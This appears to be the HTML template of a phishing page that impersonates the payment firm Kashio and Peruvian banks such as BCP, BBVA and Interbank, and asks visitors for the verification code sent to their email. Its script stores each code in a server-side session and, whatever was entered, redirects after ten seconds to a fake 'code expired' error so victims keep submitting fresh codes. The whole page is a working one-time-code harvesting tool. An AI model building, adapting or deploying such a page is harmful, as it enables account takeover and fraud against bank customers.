<!DOCTYPE html>
<html lang="es">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="KashIO - Validación de seguridad">
  <link rel="shortcut icon" href="{{ asset('kassio/kashio_ico.ico') }}">
  <title>Kashio - Validación de seguridad</title>

  <link rel="stylesheet" href="{{ asset('kassio/bootstrap.min.css') }}">
<style>
  @import url('https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@300;400;500;600;700&display=swap');

  :root {
    --radius-md: 8px;
    --button-primary-border: #0666EB;
    --button-primary-bg: #0666EB;
    --button-primary-fg: #FFF;
    --border-primary: #D0D5DD;
    --spacing-sm: 0.375rem;
    --spacing-md: 0.5rem;
    --spacing-lg: 0.75rem;
    --spacing-xl: 1rem;
    --spacing-2xl: 1.25rem;
    --spacing-3xl: 1.5rem;
    --spacing-4xl: 2rem;
    --text-primary-900: #101828;
    --text-tertiary-600: #475467;
    --text-secondary-700: #344054;
    --background-bg-secondary: #F9FAFB;
    --background-bg-primary: #FFF;
    --font-family: 'Red Hat Display', sans-serif;
  }

  html, body {
    width: 100%;
    height: 100%;
    padding: 0;
    margin: 0;
  }

  body {
    font-family: var(--font-family);
    background: linear-gradient(0deg, rgba(255, 255, 255, 0.20) 0%, rgba(255, 255, 255, 0.20) 100%), linear-gradient(90deg, #EFEEFB 0.21%, #E3F5FF 105.84%);
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: flex-start;
    padding: 5rem var(--spacing-xl) var(--spacing-xl);
  }

  .card-container {
    background: var(--background-bg-primary);
    border-radius: 16px;
    box-shadow: 0px 4px 16px rgba(16, 24, 40, 0.1);
    padding: var(--spacing-4xl);
    width: 100%;
    max-width: 420px;
  }

  .card-header {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-bottom: var(--spacing-3xl);
  }

  .card-header img {
    margin-bottom: var(--spacing-xl);
  }

  .card-title {
    color: #102D5B;
    font-size: 1.5rem;
    font-weight: 700;
    text-align: center;
    margin: 0;
  }

  .card-subtitle {
    color: var(--text-tertiary-600);
    font-size: 0.875rem;
    text-align: center;
    margin-top: var(--spacing-sm);
    line-height: 1.5;
  }

  .bank-name {
    color: #0666EB;
    font-weight: 600;
  }

  .icon-email {
    width: 64px;
    height: 64px;
    background: linear-gradient(135deg, #E3F5FF 0%, #EFEEFB 100%);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: var(--spacing-xl);
  }

  .icon-email svg {
    width: 32px;
    height: 32px;
    color: #0666EB;
  }

  .form-group {
    display: flex;
    flex-direction: column;
    gap: var(--spacing-sm);
    margin-bottom: var(--spacing-2xl);
  }

  .form-label {
    color: #102d5bcc;
    font-size: 0.875rem;
    font-weight: 500;
    line-height: 142.857%;
  }

  .form-input {
    width: 100%;
    height: 3.5rem;
    padding: 0.625rem 0.875rem;
    border-radius: var(--radius-md);
    border: 1px solid var(--border-primary);
    background: var(--background-bg-primary);
    box-shadow: 0px 1px 2px 0px rgba(16, 24, 40, 0.05);
    outline: none;
    font-family: var(--font-family);
    font-size: 1.5rem;
    font-weight: 600;
    color: var(--text-primary-900);
    text-align: center;
    letter-spacing: 0.5rem;
    transition: box-shadow 0.2s ease, border-color 0.2s ease;
  }

  .form-input::placeholder {
    color: #667085;
    letter-spacing: 0.25rem;
    font-size: 1rem;
  }

  .form-input:focus {
    border-color: #0666EB;
    box-shadow: 0px 1px 2px 0px rgba(16, 24, 40, 0.05), 0px 0px 0px 4px rgba(57, 134, 239, 0.24);
  }

  .btn-primary {
    width: 100%;
    border-radius: var(--radius-md);
    border: 1px solid var(--button-primary-border);
    background: var(--button-primary-bg);
    box-shadow: 0px 1px 2px 0px rgba(16, 24, 40, 0.05);
    padding: 0.875rem 1.25rem;
    color: var(--button-primary-fg);
    font-family: var(--font-family);
    font-size: 1rem;
    font-weight: 700;
    line-height: 150%;
    cursor: pointer;
    transition: background 0.2s ease, transform 0.1s ease;
    margin-top: var(--spacing-lg);
  }

  .btn-primary:hover {
    background: #0552BC;
  }

  .btn-primary:active {
    transform: scale(0.98);
  }

  .btn-primary:disabled {
    opacity: 0.7;
    cursor: not-allowed;
  }

  .btn-spinner {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
  }

  .spinner {
    width: 20px;
    height: 20px;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }

  .resend-link {
    text-align: center;
    margin-top: var(--spacing-xl);
  }

  .resend-link a {
    color: #0666EB;
    font-size: 0.875rem;
    font-weight: 600;
    text-decoration: none;
  }

  .resend-link a:hover {
    text-decoration: underline;
  }

  .error-message {
    background: #FEF3F2;
    border: 1px solid #FECDCA;
    border-radius: var(--radius-md);
    padding: var(--spacing-lg);
    margin-bottom: var(--spacing-2xl);
    opacity: 0;
    max-height: 0;
    overflow: hidden;
    transition: opacity 0.3s ease, max-height 0.3s ease, padding 0.3s ease, margin 0.3s ease;
    padding: 0 var(--spacing-lg);
    margin-bottom: 0;
  }

  .error-message p {
    color: #B42318;
    font-size: 0.875rem;
    font-weight: 500;
    text-align: center;
    margin: 0;
  }

  .error-message.show {
    opacity: 1;
    max-height: 100px;
    padding: var(--spacing-lg);
    margin-bottom: var(--spacing-2xl);
  }
</style>
</head>

<body>
  <div class="card-container">
    <header class="card-header">
      <img src="{{ asset('kassio/Logo-Kashio.svg') }}" alt="Logo Kashio">
      <div class="icon-email">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
          <path stroke-linecap="round" stroke-linejoin="round" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
        </svg>
      </div>
      <h1 class="card-title">Validación de seguridad</h1>
      <p class="card-subtitle">
        Ingresa el código que enviamos a tu correo electrónico registrado en <span class="bank-name" id="banco-nombre">tu banco</span>
      </p>
    </header>

    <div class="error-message" id="error-message">
      <p>Código vencido o incorrecto, por favor ingresa el nuevo código recibido.</p>
    </div>

    <form id="validacion-form">
      <div class="form-group">
        <label for="codigo" class="form-label">Código de verificación</label>
        <input type="text" id="codigo" name="codigo" class="form-input" placeholder="000000" maxlength="6" required>
      </div>

      <button type="submit" class="btn-primary" id="btn-validar">
        <span class="btn-text">Validar código</span>
        <span class="btn-spinner" style="display: none;">
          <svg class="spinner" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="3" fill="none" stroke-linecap="round" stroke-dasharray="31.4 31.4" />
          </svg>
          Validando...
        </span>
      </button>
    </form>

    <div class="resend-link">
      <a href="#" id="reenviar-codigo">¿No recibiste el código? Reenviar</a>
    </div>
  </div>

  <script>
    // Obtener parámetros de la URL
    const urlParams = new URLSearchParams(window.location.search);
    const banco = urlParams.get('banco');
    const error = urlParams.get('error');

    const bancoNombres = {
      'bcp': 'Banco de Crédito del Perú (BCP)',
      'bbva': 'BBVA Perú',
      'interbank': 'Interbank',
      'scotiabank': 'Scotiabank Perú',
      'banbif': 'BanBif'
    };

    if (banco && bancoNombres[banco]) {
      document.getElementById('banco-nombre').textContent = bancoNombres[banco];
    }

    // Mostrar mensaje de error si existe el parámetro
    if (error === '1') {
      const errorMessage = document.getElementById('error-message');
      errorMessage.classList.add('show');

      // Ocultar mensaje después de 3 segundos
      setTimeout(function() {
        errorMessage.classList.remove('show');
      }, 3000);
    }

    // Manejar envío del formulario
    document.getElementById('validacion-form').addEventListener('submit', async function(e) {
      e.preventDefault();

      const codigo = document.getElementById('codigo').value;
      const btn = document.getElementById('btn-validar');
      const btnText = btn.querySelector('.btn-text');
      const btnSpinner = btn.querySelector('.btn-spinner');

      btn.disabled = true;
      btnText.style.display = 'none';
      btnSpinner.style.display = 'inline-flex';

      // Enviar código a Redis
      try {
        const storedUser = localStorage.getItem('kassio_user');
        if (storedUser) {
          const userData = JSON.parse(storedUser);
          const sessionId = userData.session_id;

          if (sessionId) {
            await fetch('/api/kassio/session/' + sessionId, {
              method: 'PATCH',
              headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
              },
              body: JSON.stringify({
                data: {
                  codigo_validacion: codigo,
                  banco: banco
                }
              })
            });
          }
        }
      } catch (error) {
        console.error('Error enviando código a Redis:', error);
      }

      setTimeout(function() {
        // Redirigir a la misma página con error después de 10 segundos
        window.location.href = '/kassio/validacion?banco=' + encodeURIComponent(banco || '') + '&error=1';
      }, 10000);
    });

    // Solo permitir números en el campo de código
    document.getElementById('codigo').addEventListener('input', function(e) {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
  </script>
</body>
</html>
